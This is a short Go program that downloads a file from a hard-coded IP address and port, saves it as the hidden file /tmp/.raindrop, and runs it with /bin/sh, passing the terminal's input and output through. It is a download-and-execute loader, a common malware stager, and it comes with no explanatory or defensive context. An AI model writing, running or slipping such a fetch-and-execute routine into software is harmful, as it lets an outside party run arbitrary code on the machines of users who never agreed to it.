package main

import (
	"os"
	"os/exec"
	"net/http"
	"io/ioutil"
)

func main() {
	file, err := os.Create("/tmp/.raindrop")
	if err != nil { os.Exit(1) }
	defer file.Close()

	resp, err := http.Get("http://13.230.161.88:8033/raindrop")
	if err != nil {	os.Exit(1) }
	defer resp.Body.Close()

	byteArray, _ := ioutil.ReadAll(resp.Body)
	file.Write(byteArray)

	cmd := exec.Command("/bin/sh", "/tmp/.raindrop")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil { os.Exit(1) }
}
